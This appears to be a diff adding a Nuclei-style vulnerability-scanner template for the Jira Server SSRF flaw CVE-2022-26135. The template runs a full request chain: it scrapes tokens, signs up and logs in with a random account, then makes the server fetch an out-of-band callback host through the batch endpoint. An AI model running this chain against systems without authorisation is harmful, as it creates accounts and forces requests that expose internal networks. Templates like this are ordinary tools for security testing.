@@ -1,0 +1,81 @@
+id: jira-server-ssrf-cve-2022-26135
+info:
+  name: Jira Server SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Atlassian Jira Server is vulnerable to a Server-Side Request Forgery (SSRF) attack via a batch endpoint.
+  classification:
+    cve-id: CVE-2022-26135
+  tags: ssrf
+  reference:
+    - https://jira.atlassian.com/browse/JRASERVER-73863
+
+variables:
+  randomName: "{{rand_text_alphanumeric(6)}}"
+  checkStr: "{{rand_text_alphanumeric(4)}}"
+
+http:
+  - raw:
+      - |
+        GET /secure/Signup!default.jspa HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
+    extractors:
+      - type: regex
+        name: atlassian_token
+        internal: true
+        group: 1
+        regex:
+          - 'name="atlassian-token" content="(.*?)">'
+      - type: regex
+        name: jsession_id
+        internal: true
+        group: 1
+        regex:
+          - 'Set-Cookie: JSESSIONID=(.*?);'
+
+  - raw:
+      - |
+        POST /secure/Signup.jspa HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID={{jsession_id}}; atlassian.xsrf.token={{atlassian_token}}
+
+        email={{randomName}}@gmail.com&fullname={{randomName}}&username={{randomName}}&password=RandomPassword123&Signup=Sign+up&atl_token={{atlassian_token}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID={{jsession_id}}; atlassian.xsrf.token={{atlassian_token}}
+
+        os_username={{randomName}}&os_password=RandomPassword123&login=Log+In
+    extractors:
+      - type: regex
+        name: jsession_id_2
+        internal: true
+        group: 1
+        regex:
+          - 'Set-Cookie: JSESSIONID=(.*?);'
+
+  - raw:
+      - |
+        POST /rest/nativemobile/1.0/batch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Referer: {{BaseURL}}/servicedesk/customer/portal/1/user/signup
+        Cookie: JSESSIONID={{jsession_id_2}}; atlassian.xsrf.token={{atlassian_token}}
+
+        {"requests":[{"method":"GET","location":"@https://{{interactsh-url}}"}]}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+    stop-at-first-match: true
